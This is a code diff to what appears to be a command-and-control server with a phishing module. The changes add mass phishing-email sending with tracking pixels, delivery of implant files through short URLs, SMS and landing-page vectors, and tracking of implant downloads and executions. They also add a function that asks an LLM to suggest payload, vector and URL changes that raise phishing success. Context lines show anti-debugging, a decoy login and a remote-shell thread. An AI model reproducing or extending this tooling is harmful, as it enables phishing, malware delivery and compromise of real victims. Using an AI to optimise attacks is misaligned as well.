@@ -67,7 +67,7 @@ from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from dnslib import DNSRecord, DNSHeader, RR, QTYPE, A, TXT, CNAME, MX, NS, SOA, CAA, TLSA, SSHFP
 from dnslib.dns import RR, QTYPE, A, NS, SOA, TXT, CNAME, MX, AAAA, PTR, SRV, NAPTR, CAA, TLSA, SSHFP
 from flask_login import LoginManager, UserMixin, login_user, login_required, logout_user, current_user
-from flask import Flask, request, render_template, redirect, url_for, jsonify, Response, send_from_directory, render_template_string, flash, abort, jsonify, Response, stream_with_context, Blueprint, send_file
+from flask import Flask, request, render_template, redirect, url_for, jsonify, Response, send_from_directory, render_template_string, flash, abort, jsonify, Response, stream_with_context, Blueprint, send_file, current_app
 
 anti_debug()
 logger = logging.getLogger(__name__)
@@ -81,6 +81,41 @@ if config.enable_c2_debug == True:
 else:
     logging.basicConfig(filename='sessions/access.log', level=logging.CRITICAL, format='%(asctime)s - %(levelname)s - %(message)s')
 
+def clean_expired_tokens():
+    conn = sqlite3.connect(DB_PATH)
+    cursor = conn.cursor()
+    cursor.execute('DELETE FROM auth_tokens WHERE expiry < ?', (int(time.time()),))
+    conn.commit()
+    conn.close()
+
+def clean_json(texto):
+    """Extract only the JSON content between ```json and ```, discarding everything else."""
+    match = re.search(r'```json\n(.*?)\n```', texto, re.DOTALL)
+    if match:
+        return match.group(1).strip()
+    return ""
+
+def load_yaml_safely(file_path):
+    """Load a YAML file safely with error handling and default values."""
+    try:
+        with open(file_path, 'r') as f:
+            data = yaml.safe_load(f)
+            if not data:
+                logger.error(f"Empty YAML file: {file_path}")
+                return None
+
+            data.setdefault('beacon_url', '')
+            data.setdefault('created_at', datetime.now(timezone.utc).isoformat())
+            return data
+    except yaml.YAMLError as e:
+        logger.error(f"Invalid YAML in {file_path}: {e}")
+        return None
+    except FileNotFoundError:
+        logger.error(f"YAML file not found: {file_path}")
+        return None
+    except Exception as e:
+        logger.error(f"Error loading YAML {file_path}: {e}")
+        return None
 class Handler(FileSystemEventHandler):
     @staticmethod
     def on_any_event(event):
@@ -1262,6 +1297,25 @@ def analyze_behavioral_data(behavioral_events):
         })
     return analysis_results
 
+def analyze_campaign_progress(campaign_id, events):
+    """Analyze campaign progress and suggest adaptations using Grok AI."""
+    client = Groq(api_key=GROQ_API_KEY)
+    prompt = f"""
+    You are an AI assistant analyzing a ethic phishing campaign simulation. Given the campaign ID {campaign_id} with events: {json.dumps(events)}.
+    Suggest adaptations (e.g., change vector, payload, URL) to improve success rate.
+    **Important**: Return your response as a valid JSON object with the following structure:
+    ```json
+    Return JSON: ```json{{ "vector": str, "payload": str, "short_url": str }}```
+    """
+    response = client.chat.completions.create(
+        model="llama3-70b-8192",
+        messages=[{"role": "user", "content": prompt}],
+        max_tokens=200
+    )
+    if config.enable_c2_debug == True:
+        print(response.choices[0].message.content)
+    return json.loads(clean_json(response.choices[0].message.content.strip()))
+
 SAVE_DIR = "sessions/captured_images"
 if not os.path.exists(SAVE_DIR):
     os.makedirs(SAVE_DIR)
@@ -1272,7 +1326,7 @@ app = Flask(__name__, static_folder='static')
 limiter = Limiter(
     app=app,
     key_func=get_remote_address,
-    default_limits=["2000 per day", "500 per hour"]
+    default_limits=[config.c2_daily_limit, config.c2_hour_limit]
 )
 SESSION_ID = str(uuid.uuid4())
 app.secret_key = 'GrisIsComebackSayKnokKnokSecretlyxDjajajja' + SESSION_ID
@@ -1343,14 +1397,21 @@ conn.execute('''CREATE TABLE IF NOT EXISTS behavioral_tracking (
     behavior_data TEXT
 )''')
 conn.commit()
+conn.execute('''CREATE TABLE IF NOT EXISTS multivector_tracking (
+    id INTEGER PRIMARY KEY AUTOINCREMENT,
+    campaign_id TEXT,
+    email TEXT,
+    event_type TEXT,
+    ip TEXT,
+    timestamp TEXT
+)''')
+conn.commit()
 conn.close()
 with open(f"{path}/sessions/key.aes", 'rb') as f:
     AES_KEY = f.read()
 
 if not os.path.exists(UPLOAD_FOLDER):
     os.makedirs(UPLOAD_FOLDER)
-
-logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 
 api_key = config.api_key
 route_maleable = config.c2_maleable_route
@@ -1836,7 +1897,7 @@ def create_short_url():
         return jsonify({'error': 'No data provided'}), 400
     original_url = data.get('original_url')
     custom_short_url = data.get('custom_short_url')
-    count = data.get('count', 1)  # Number of URLs to generate
+    count = data.get('count', 1)
     if not original_url:
         logging.warning("No original_url provided")
         return jsonify({'error': 'Original URL is required'}), 400
@@ -1930,6 +1991,22 @@ def redirect_to_file(short_url):
     except Exception as e:
         logging.error(f"Error in redirect_to_file: {str("")}")
         return jsonify({'error': f'Internal server error: {str("")}'}), 500
+
+@app.route('/s/<filename>')
+def download_files(filename):
+    short_urls = load_short_urls()
+    for short_url, data in short_urls.items():
+        if not data.get('active', False):
+            continue
+        parsed_url = urlparse(data['original_url'])
+        original_filename = os.path.basename(parsed_url.path)
+        if filename == original_filename:
+            file_path = os.path.join(SESSIONS_DIR, original_filename)
+            if os.path.isfile(file_path):
+                return send_from_directory(SESSIONS_DIR, original_filename)
+            else:
+                abort(404, description="Error 404: File not Found")
+    abort(403, description="Acceso denegado o archivo no válido")
 
 @app.route('/view_yaml', methods=['POST'])
 @requires_auth
@@ -2742,7 +2819,7 @@ def register():
     return render_template('register.html')
 
 @app.route('/login', methods=['GET', 'POST'])
-@limiter.limit("5 per minute")
+@limiter.limit(config.c2_login_limit)
 def login():
     response = decoy()
     if response:
@@ -3278,8 +3355,8 @@ def list_campaigns():
     campaigns = []
     for filename in os.listdir(CAMPAIGNS_DIR):
         if filename.endswith('.yaml'):
-            with open(os.path.join(CAMPAIGNS_DIR, filename)) as f:
-                campaign = yaml.safe_load(f)
+            campaign = load_yaml_safely(os.path.join(CAMPAIGNS_DIR, filename))
+            if campaign:
                 campaign['id'] = filename.replace('.yaml', '')
                 campaigns.append(campaign)
     return render_template('phishing/campaigns.html', campaigns=campaigns)
@@ -3290,56 +3367,74 @@ def create_campaign():
     if request.method == 'POST':
         data = request.form
         campaign_id = str(uuid.uuid4())
+
+        if not data.get('name') or not data.get('template') or not data.get('recipients'):
+            flash('Name, template, and recipients are required.', 'error')
+            return redirect(url_for('phishing.create_campaign'))
+
+        beacon_url = data.get('beacon_url', '')
+        if not beacon_url:
+            logger.warning(f"Campaign {campaign_id} created with empty beacon_url")
+            short_url = secrets.token_urlsafe(6)
+            short_urls = load_short_urls()
+            short_urls[short_url] = {
+                'original_url': f'http://{request.host}/track/{short_url}',
+                'active': True,
+                'created_at': datetime.now().isoformat()
+            }
+            save_short_urls(short_urls)
+            beacon_url = f'http://{request.host}/{short_url}'
+
         campaign = {
             'name': data['name'],
             'template': data['template'],
             'recipients': [r.strip() for r in data['recipients'].split(',')],
-            'beacon_url': data.get('beacon_url', ''),
+            'beacon_url': beacon_url,
             'created_at': datetime.now(timezone.utc).isoformat()
         }
         try:
             with open(os.path.join(CAMPAIGNS_DIR, f'{campaign_id}.yaml'), 'w') as f:
-                yaml.dump(campaign, f)
-            logger.debug(f"Campaign {campaign_id} saved successfully")
+                yaml.safe_dump(campaign, f)
+            logger.info(f"Campaign {campaign_id} saved successfully")
         except Exception as e:
             logger.error(f"Error saving campaign {campaign_id}: {e}")
-            return jsonify({"status": "error", "message": f"Failed to save campaign: {str("")}"}), 500
+            flash('Failed to save campaign.', 'error')
+            return redirect(url_for('phishing.create_campaign'))
 
         try:
-            with open(os.path.join(TEMPLATES_DIR, f"{campaign['template']}.yaml")) as f:
-                template = yaml.safe_load(f)
+            template_file = os.path.join(TEMPLATES_DIR, f"{campaign['template']}.yaml")
+            template = load_yaml_safely(template_file)
+            if not template:
+                flash('Invalid email template.', 'error')
+                return redirect(url_for('phishing.create_campaign'))
 
-            logger.debug("Initializing yagmail SMTP connection")
             with yagmail.SMTP(GMAIL_ADDRESS, GMAIL_APP_PASSWORD) as yag:
                 for recipient in campaign['recipients']:
                     tracking_url = url_for('phishing.track_pixel', campaign_id=campaign_id, email=recipient, _external=True)
-                    
                     html_body = template['body'].format(
                         name=recipient.split('@')[0],
                         beacon_url=campaign['beacon_url'],
                         tracking_pixel=f'<img src="{tracking_url}" width="1" height="1" alt="" />'
                     )
-
-                    logger.debug(f"Sending email to {recipient} via Gmail")
                     yag.send(
                         to=recipient,
                         subject=template['subject'],
                         contents=html_body
                     )
-                    logger.info(f"Successfully sent email to {recipient} via Gmail")
+                    logger.info(f"Sent email to {recipient} for campaign {campaign_id}")
 
                     conn = sqlite3.connect(DB_PATH)
                     conn.execute('INSERT INTO tracking VALUES (?, ?, ?, ?, ?)',
-                                 (campaign_id, recipient, 'sent', request.remote_addr, datetime.utcnow().isoformat()))
+                                 (campaign_id, recipient, 'sent', request.remote_addr, datetime.now().isoformat()))
                     conn.commit()
                     conn.close()
 
-            logger.info(f"Campaign {campaign_id} sent to {len(campaign['recipients'])} recipients via Gmail")
+            flash(f"Campaign {campaign['name']} sent to {len(campaign['recipients'])} recipients.", 'success')
             return redirect(url_for('phishing.list_campaigns'))
         except Exception as e:
-            error_msg = f"Error sending campaign {campaign_id}: {str("")}"
-            logger.error(error_msg)
-            return jsonify({"status": "error", "message": str("")}), 500
+            logger.error(f"Error sending campaign {campaign_id}: {e}")
+            flash('Failed to send campaign emails.', 'error')
+            return redirect(url_for('phishing.create_campaign'))
     templates = [f.replace('.yaml', '') for f in os.listdir(TEMPLATES_DIR) if f.endswith('.yaml')]
     return render_template('phishing/new_campaign.html', templates=templates)
 
@@ -3373,17 +3468,14 @@ def track_pixel(campaign_id, email):
 @phishing_bp.route('/phishing/<campaign_id>/report')
 @login_required
 def campaign_report(campaign_id):
-    """Generate report for a phishing campaign with tracking, download, and execution events."""
     campaign_file = os.path.join(CAMPAIGNS_DIR, f'{campaign_id}.yaml')
-    if not os.path.exists(campaign_file):
-        logging.error(f"Campaign file not found: {campaign_file}")
+    campaign = load_yaml_safely(campaign_file)
+    if not campaign:
         abort(404)
-    with open(campaign_file) as f:
-        campaign = yaml.safe_load(f)
-        campaign['id'] = campaign_id
+    campaign['id'] = campaign_id
 
     short_urls = load_short_urls()
-    beacon_url = campaign.get('beacon_url', '')
+    beacon_url = campaign.get('beacon_url', '') if 'vectors' not in campaign else ''
     beacon_short_url = urlparse(beacon_url).path.lstrip('/') if beacon_url else ''
 
     conn = sqlite3.connect(DB_PATH)
@@ -3394,6 +3486,8 @@ def campaign_report(campaign_id):
     events = [{'email': row[0], 'event': row[1], 'ip': row[2], 'timestamp': row[3]} for row in cursor.fetchall()]
     cursor.execute('SELECT email, event_type, ip, user_agent, timestamp, behavior_data FROM behavioral_tracking WHERE campaign_id = ? OR short_url = ? ORDER BY timestamp DESC', (campaign_id, beacon_short_url))
     behavioral_events = [{'email': row[0], 'event_type': row[1], 'ip': row[2], 'user_agent': row[3], 'timestamp': row[4], 'behavior_data': row[5]} for row in cursor.fetchall()]
+    cursor.execute('SELECT email, event_type, ip, timestamp FROM multivector_tracking WHERE campaign_id = ? ORDER BY timestamp DESC', (campaign_id,))
+    multivector_events = [{'email': row[0], 'event_type': row[1], 'ip': row[2], 'timestamp': row[3]} for row in cursor.fetchall()]
     conn.close()
 
     download_events = []
@@ -3401,11 +3495,10 @@ def campaign_report(campaign_id):
     if beacon_short_url:
         download_events = parse_access_log_for_short_url(beacon_short_url)
         stats['downloaded'] = len(download_events)
-        stats['interactions'] = len(behavioral_events)
+        stats['interactions'] = len(behavioral_events) + len(multivector_events)
         original_url = short_urls.get(beacon_short_url, {}).get('original_url', 'Unknown')
         for event in download_events:
             event['original_url'] = original_url
-
         implante = short_urls.get(beacon_short_url, {}).get('original_url', '').split('/')[-1].replace('.exe', '')
         if implante:
             implant_config = load_implant_config(implante)
@@ -3413,15 +3506,247 @@ def campaign_report(campaign_id):
                 execution_events = parse_execution_log(implante)
                 stats['executed'] = len(execution_events)
 
+    if 'vectors' in campaign:
+        for vector_type, vector_data in campaign['vectors'].items():
+            beacon_url = vector_data.get('beacon_url', '')
+            if beacon_url:
+                beacon_short_url = urlparse(beacon_url).path.lstrip('/')
+                download_events.extend(parse_access_log_for_short_url(beacon_short_url))
+                stats['downloaded'] = len(download_events)
+
     behavioral_analysis = analyze_behavioral_data(behavioral_events)
-    return render_template('phishing/report.html', 
-                         campaign=campaign, 
-                         stats=stats, 
-                         events=events, 
+    return render_template('phishing/report.html',
+                         campaign=campaign,
+                         stats=stats,
+                         events=events,
                          download_events=download_events,
                          execution_events=execution_events,
-                         behavioral_analysis=behavioral_analysis)
-  
+                         behavioral_analysis=behavioral_analysis,
+                         multivector_events=multivector_events)
+
+@phishing_bp.route('/phishing/<campaign_id>/orchestrate', methods=['GET', 'POST'])
+@login_required
+def orchestrate_campaign(campaign_id):
+    campaign_file = os.path.join(CAMPAIGNS_DIR, f'{campaign_id}.yaml')
+    campaign = load_yaml_safely(campaign_file)
+    if not campaign:
+        abort(404)
+    campaign['id'] = campaign_id
+
+    if request.method == 'GET':
+        return render_template('phishing/orchestrate_campaign.html', campaign=campaign)
+
+    conn = sqlite3.connect(DB_PATH)
+    cursor = conn.cursor()
+    cursor.execute('SELECT email, event_type, ip, timestamp FROM multivector_tracking WHERE campaign_id = ?', (campaign_id,))
+    events = [{'email': row[0], 'event_type': row[1], 'ip': row[2], 'timestamp': row[3]} for row in cursor.fetchall()]
+    conn.close()
+
+    adaptations = analyze_campaign_progress(campaign_id, events)
+    short_urls = load_short_urls()
+    new_short_url = adaptations.get('short_url', secrets.token_urlsafe(6))
+    beacon_url = campaign.get('beacon_url', '') if 'vectors' not in campaign else campaign['vectors'].get('email', {}).get('beacon_url', '')
+    short_urls[new_short_url] = {
+        'original_url': adaptations.get('payload', beacon_url),
+        'active': True,
+        'created_at': datetime.now().isoformat()
+    }
+    save_short_urls(short_urls)
+
+    conn = sqlite3.connect(DB_PATH)
+    cursor = conn.cursor()
+    cursor.execute(
+        'INSERT INTO multivector_tracking (campaign_id, email, event_type, ip, timestamp) VALUES (?, ?, ?, ?, ?)',
+        (campaign_id, 'unknown', adaptations['vector'], request.remote_addr, datetime.now().isoformat())
+    )
+    conn.commit()
+    conn.close()
+
+    return jsonify({'status': 'adapted', 'vector': adaptations['vector'], 'short_url': new_short_url})
+
+
+@phishing_bp.route('/phishing/create_multivector_campaign', methods=['GET', 'POST'])
+@login_required
+def create_multivector_campaign():
+    if request.method == 'GET':
+
+        token = secrets.token_urlsafe(32)
+        expiry = int(time.time()) + 3600
+
+
+        conn = sqlite3.connect(DB_PATH)
+        cursor = conn.cursor()
+        cursor.execute('''CREATE TABLE IF NOT EXISTS auth_tokens
+                         (user_id INTEGER, token TEXT, expiry INTEGER)''')
+        cursor.execute('INSERT INTO auth_tokens (user_id, token, expiry) VALUES (?, ?, ?)',
+                       (current_user.id, token, expiry))
+        conn.commit()
+        conn.close()
+
+        return render_template('phishing/create_multivector_campaign.html',
+                              auth_token=token)
+
+    if request.method == 'POST':
+        yaml_input = request.form.get('yaml_input')
+        auth_token = request.form.get('auth_token')
+
+
+        conn = sqlite3.connect(DB_PATH)
+        cursor = conn.cursor()
+        cursor.execute('SELECT expiry FROM auth_tokens WHERE user_id = ? AND token = ?',
+                       (current_user.id, auth_token))
+        result = cursor.fetchone()
+        conn.close()
+
+        if not result or result[0] < int(time.time()):
+            flash('Invalid or expired authentication token.', 'error')
+            return redirect(url_for('phishing.create_multivector_campaign'))
+
+        if not yaml_input:
+            flash('YAML input is required.', 'error')
+            return redirect(url_for('phishing.create_multivector_campaign'))
+
+        try:
+            data = yaml.safe_load(yaml_input)
+            if not data or not data.get('name') or not data.get('vectors'):
+                flash('Campaign name and vectors are required.', 'error')
+                return redirect(url_for('phishing.create_multivector_campaign'))
+        except yaml.YAMLError as e:
+            logger.error(f"Invalid YAML: {e}")
+            flash(f'Invalid YAML: {e}', 'error')
+            return redirect(url_for('phishing.create_multivector_campaign'))
+
+        campaign_id = str(uuid.uuid4())
+        campaign = {
+            'id': campaign_id,
+            'name': data['name'],
+            'vectors': data.get('vectors', {}),
+            'created_at': datetime.now().isoformat()
+        }
+        try:
+            with open(os.path.join(CAMPAIGNS_DIR, f'{campaign_id}.yaml'), 'w') as f:
+                yaml.safe_dump(campaign, f)
+            logger.info(f"Created multi-vector campaign: {campaign_id}")
+        except Exception as e:
+            logger.error(f"Error saving campaign {campaign_id}: {e}")
+            flash('Failed to save campaign.', 'error')
+            return redirect(url_for('phishing.create_multivector_campaign'))
+
+        conn = sqlite3.connect(DB_PATH)
+        cursor = conn.cursor()
+        short_urls = load_short_urls()
+
+        if 'email' in campaign['vectors']:
+            email_vector = campaign['vectors']['email']
+            template_file = os.path.join(TEMPLATES_DIR, f"{email_vector.get('template', '')}.yaml")
+            template = load_yaml_safely(template_file)
+            if not template:
+                flash('Invalid email template.', 'error')
+                return redirect(url_for('phishing.create_multivector_campaign'))
+            beacon_url = email_vector.get('beacon_url', '')
+            if not beacon_url:
+                short_url = secrets.token_urlsafe(6)
+                short_urls[short_url] = {
+                    'original_url': f'http://{request.host}/track/{short_url}',
+                    'active': True,
+                    'created_at': datetime.now().isoformat()
+                }
+                beacon_url = f'http://{request.host}/{short_url}'
+                campaign['vectors']['email']['beacon_url'] = beacon_url
+            with yagmail.SMTP(GMAIL_ADDRESS, GMAIL_APP_PASSWORD) as yag:
+                for recipient in email_vector.get('recipients', []):
+                    tracking_url = url_for('phishing.track_pixel', campaign_id=campaign_id, email=recipient, _external=True)
+                    html_body = template['body'].format(
+                        name=recipient.split('@')[0],
+                        beacon_url=beacon_url,
+                        tracking_pixel=f'<img src="{tracking_url}" width="1" height="1" alt="" />'
+                    )
+                    yag.send(
+                        to=recipient,
+                        subject=template['subject'],
+                        contents=html_body
+                    )
+                    cursor.execute(
+                        'INSERT INTO multivector_tracking (campaign_id, email, event_type, ip, timestamp) VALUES (?, ?, ?, ?, ?)',
+                        (campaign_id, recipient, 'email_sent', request.remote_addr, datetime.now().isoformat())
+                    )
+
+        if 'sms' in campaign['vectors']:
+            sms_vector = campaign['vectors']['sms']
+            beacon_url = sms_vector.get('beacon_url', '')
+            if not beacon_url:
+                short_url = secrets.token_urlsafe(6)
+                short_urls[short_url] = {
+                    'original_url': f'http://{request.host}/track/{short_url}',
+                    'active': True,
+                    'created_at': datetime.now().isoformat()
+                }
+                beacon_url = f'http://{request.host}/{short_url}'
+                campaign['vectors']['sms']['beacon_url'] = beacon_url
+            message = sms_vector.get('message', '')
+            for recipient in sms_vector.get('recipients', []):
+                try:
+                    formatted_message = message.format(beacon_url=beacon_url)
+                    logger.info(f"Sent SMS to {recipient} with message: {formatted_message}")
+                    cursor.execute(
+                        'INSERT INTO multivector_tracking (campaign_id, email, event_type, ip, timestamp) VALUES (?, ?, ?, ?, ?)',
+                        (campaign_id, recipient, 'sms_sent', request.remote_addr, datetime.now().isoformat())
+                    )
+                except Exception as e:
+                    logger.error(f"Error sending SMS to {recipient}: {e}")
+
+        if 'landing_page' in campaign['vectors']:
+            landing_vector = campaign['vectors']['landing_page']
+            beacon_url = landing_vector.get('beacon_url', '')
+            if not beacon_url:
+                short_url = secrets.token_urlsafe(6)
+                short_urls[short_url] = {
+                    'original_url': f'http://{request.host}/track/{short_url}',
+                    'active': True,
+                    'created_at': datetime.now().isoformat()
+                }
+                beacon_url = f'http://{request.host}/{short_url}'
+                campaign['vectors']['landing_page']['beacon_url'] = beacon_url
+
+            template_name = landing_vector.get('template', '')
+            if template_name:
+                cursor.execute(
+                    'INSERT INTO multivector_tracking (campaign_id, email, event_type, ip, timestamp) VALUES (?, ?, ?, ?, ?)',
+                    (campaign_id, 'unknown', 'landing_page_created', request.remote_addr, datetime.now().isoformat())
+                )
+        save_short_urls(short_urls)
+        conn.commit()
+        conn.close()
+
+        with open(os.path.join(CAMPAIGNS_DIR, f'{campaign_id}.yaml'), 'w') as f:
+            yaml.safe_dump(campaign, f)
+
+        
+        return jsonify({'campaign_id': campaign_id, 'message': 'Multi-vector campaign created successfully'}), 200
+        
+
+@phishing_bp.route('/phishing/landing/<campaign_id>/<short_url>')
+def serve_landing_page(campaign_id, short_url):
+    campaign_file = os.path.join(CAMPAIGNS_DIR, f'{campaign_id}.yaml')
+    campaign = load_yaml_safely(campaign_file)
+    if not campaign or 'landing_page' not in campaign.get('vectors', {}):
+        abort(404)
+    short_urls = load_short_urls()
+    if short_url not in short_urls or not short_urls[short_url]['active']:
+        abort(404)
+    template_name = campaign['vectors']['landing_page'].get('template', '')
+    if not template_name:
+        abort(404)
+    conn = sqlite3.connect(DB_PATH)
+    cursor = conn.cursor()
+    cursor.execute(
+        'INSERT INTO multivector_tracking (campaign_id, email, event_type, ip, timestamp) VALUES (?, ?, ?, ?, ?)',
+        (campaign_id, 'unknown', 'landing_page_visit', request.remote_addr, datetime.now().isoformat())
+    )
+    conn.commit()
+    conn.close()
+    return render_template(f'phishing/landing_pages/{template_name}.html', beacon_url=short_urls[short_url]['original_url'])
+
 thread = Thread(target=run_shell)
 thread.daemon = True
 thread.start()
